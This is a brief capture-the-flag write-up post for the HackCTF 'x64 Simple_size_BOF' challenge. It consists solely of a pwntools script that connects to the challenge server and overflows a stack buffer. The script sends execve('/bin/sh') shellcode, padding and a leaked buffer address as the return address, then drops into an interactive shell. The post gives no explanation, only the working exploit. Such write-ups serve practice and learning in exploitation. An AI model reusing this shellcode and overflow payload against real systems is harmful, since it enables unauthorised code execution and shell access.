---
title: "[HackCTF] x64 Simple_size_BOF"
date: 2020-07-09
ctf: HackCTF
tag: [pwnable]
layout: post
---

{% highlight python %}
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3005)

p.recvuntil("buf: ")
buf = int(p.recv(1024),16)
print(hex(buf))

p.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"A"*27933+p64(buf))
p.interactive()
{% endhighlight %}
